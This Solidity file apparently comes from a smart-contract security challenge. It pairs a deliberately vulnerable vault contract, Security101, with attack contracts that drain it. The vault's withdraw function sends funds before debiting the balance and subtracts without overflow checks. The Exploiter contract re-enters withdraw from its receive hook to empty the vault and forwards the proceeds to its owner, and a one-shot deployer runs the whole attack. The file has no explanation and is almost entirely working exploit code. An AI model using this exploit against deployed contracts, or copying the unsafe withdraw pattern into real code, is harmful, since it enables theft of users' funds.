// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

contract Exploiter {
    Security101 immutable victim;
    address immutable owner;

    constructor(address _victim, address _owner) {
        victim = Security101(_victim);
        owner = _owner;
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw(msg.value);
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        uint256 remaining = address(victim).balance;
        if (remaining == 0) {
            return;
        }

        victim.deposit{value: msg.value}();
        uint256 inflated = address(victim).balance;

        uint256 want = msg.value * 2;
        uint256 toWithdraw = want <= inflated ? want : inflated;

        victim.withdraw(toWithdraw);
    }
}

contract OptimizedAttackerSecurity101 {
    constructor(address _victim) payable {
        Exploiter exploiter = new Exploiter(_victim, msg.sender);
        exploiter.attack{value: msg.value}();
    }
}
